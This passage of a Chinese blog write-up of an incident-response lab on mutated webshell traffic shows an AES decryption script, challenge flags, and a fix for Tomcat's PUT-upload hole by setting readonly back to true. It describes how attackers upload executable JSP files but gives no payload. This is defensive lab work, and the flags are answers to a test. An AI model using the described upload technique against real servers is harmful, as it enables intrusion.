+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Random</span> <span class="kn">import</span> <span class="n">get_random_bytes</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt_file</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># 打开输入和输出文件</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">infile</span><span class="p">,</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">outfile</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 读取并验证 IV</span>
+</span></span><span class="line"><span class="cl">        <span class="n">iv_from_file</span> <span class="o">=</span> <span class="n">infile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">iv_from_file</span><span class="p">)</span> <span class="o">!=</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;IV 长度不正确！&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">        <span class="c1"># 创建 AES 解密器</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv_from_file</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 循环解密文件内容</span>
+</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">chunk</span> <span class="o">=</span> <span class="n">infile</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>  <span class="c1"># 文件结束</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">            <span class="c1"># 解密</span>
+</span></span><span class="line"><span class="cl">            <span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1"># 写入解密的数据，移除填充</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">decrypted_data</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">            <span class="n">outfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;文件解密完成。&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;用法: python decrypt.py &lt;输入文件&gt; &lt;输出文件&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">input_file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">output_file</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">65</span> <span class="o">+</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">16</span><span class="p">)])</span>  <span class="c1"># 密钥</span>
+</span></span><span class="line"><span class="cl">    <span class="n">iv</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="mi">97</span> <span class="o">+</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">AES</span><span class="o">.</span><span class="n">block_size</span><span class="p">)])</span>  <span class="c1"># IV</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">decrypt_file</span><span class="p">(</span><span class="n">input_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="images/image-20241211143351-6e8hxwj.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211143351-6e8hxwj.png, images/image-20241211143351-6e8hxwj.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211143351-6e8hxwj.png 2x" sizes="auto" data-title="image" data-alt="image" width="1244" height="232" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>flag{0ba9af0100c01e88a3a1280ec5b39715}</p>
+<h2 id="10请你找到并修复入口漏洞后运行root下的check_tomcat文件将得到的flag提交">10、请你找到并修复入口漏洞后运行/root下的check_tomcat文件，将得到的flag提交</h2>
+<p>启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。</p>
+<p>编辑tomcat配置文件</p>
+<div class="highlight" id="id-9"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">vim</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">apache</span><span class="o">-</span><span class="n">tomcat</span><span class="o">-</span><span class="mf">8.5.19</span><span class="o">/</span><span class="n">conf</span><span class="o">/</span><span class="n">web</span><span class="o">.</span><span class="n">xml</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改为true</p>
+<p><img loading="lazy" src="images/image-20241211151534-hrlw4t2.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211151534-hrlw4t2.png, images/image-20241211151534-hrlw4t2.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211151534-hrlw4t2.png 2x" sizes="auto" data-title="image" data-alt="image" width="1500" height="512" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>然后重启tomcat服务，最后check即可</p>
+<p><img loading="lazy" src="images/image-20241211151640-u29tbil.png" srcset="/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211151640-u29tbil.png, images/image-20241211151640-u29tbil.png 1.5x, /posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/image-20241211151640-u29tbil.png 2x" sizes="auto" data-title="image" data-alt="image" width="796" height="86" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const a of ['style','data-title','data-alt','onerror','onload']){this.removeAttribute(a);}"/>​</p>
+<p>flag{ba5579c780bf4a799e03a60c6be383e9}</p>
+<h2 id="参考">参考</h2>
+<p>样本相关参考：https://mp.weixin.qq.com/s?__biz=MzkyNzcxNTczNA==&amp;mid=2247486297&amp;idx=1&amp;sn=8de65caed3d75322d7e2eda8ab4e8c0a&amp;source=41#wechat_redirect</p>
+<p>‍</p>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="Updated on 2024-12-30 21:47:44">Updated on 2024-12-30&nbsp;</span>
+      </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"></div>
+      <div class="post-info-share">
+        <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-title="某变异Webshell流量分析" data-via="XL_xiaole" data-hashtags="应急响应,玄机,哥斯拉流量分析"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-hashtag="应急响应"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://localhost:1313/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-title="某变异Webshell流量分析" data-web><i class="fa-brands fa-whatsapp fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://localhost:1313/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-title="某变异Webshell流量分析"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-title="某变异Webshell流量分析"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Myspace" data-sharer="myspace" data-url="http://localhost:1313/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-title="某变异Webshell流量分析" data-description=""><i data-svg-src="/lib/simple-icons/icons/myspace.min.svg" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Blogger" data-sharer="blogger" data-url="http://localhost:1313/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-title="某变异Webshell流量分析" data-description=""><i class="fa-brands fa-blogger fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="http://localhost:1313/posts/%E6%9F%90%E5%8F%98%E5%BC%82webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" data-title="某变异Webshell流量分析"><i class="fa-brands fa-evernote fa-fw" aria-hidden="true"></i></a>
+  </span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/' class="post-tag">应急响应</a><a href='/tags/%E7%8E%84%E6%9C%BA/' class="post-tag">玄机</a><a href='/tags/%E5%93%A5%E6%96%AF%E6%8B%89%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/' class="post-tag">哥斯拉流量分析</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" class="post-nav-item" rel="prev" title="哥斯拉ekp版本流量分析"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>哥斯拉ekp版本流量分析</a></div>
+</div>
+</article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.123.8">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.18-lts.1"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2021 - 2025</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line statistics"></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='Total visitors'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='Total visits'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">Theme FixIt works best with JavaScript enabled.</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/lunr/lunr.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":500},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"typeit-header-desktop":"xia0le's Blog","typeit-header-title-mobile":"xia0le's Blog"},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"typeit-header-desktop":["typeit-header-desktop"],"typeit-header-title-mobile":["typeit-header-title-mobile"]},"duration":-1,"loop":false,"speed":100}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
